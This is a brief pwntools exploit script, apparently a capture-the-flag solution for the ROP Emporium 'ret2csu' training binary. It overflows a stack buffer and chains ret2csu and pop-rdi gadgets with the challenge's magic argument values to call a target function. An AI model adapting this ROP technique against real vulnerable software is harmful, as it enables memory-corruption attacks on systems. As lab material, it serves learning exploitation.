from pwn import *

elf = ELF("./ret2csu")
rop = ROP(elf)

payload = b'a'*0x28
payload += p64(0x40069a)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(0x6003b0)
payload += p64(0x0)
payload += p64(0xcafebabecafebabe)
payload += p64(0xd00df00dd00df00d)
payload += p64(0x400680)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(rop.rdi.address)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(0x400510)

#conn=gdb.debug("./ret2csu")
conn=process("./ret2csu")

conn.sendlineafter("> ", payload)

conn.interactive()
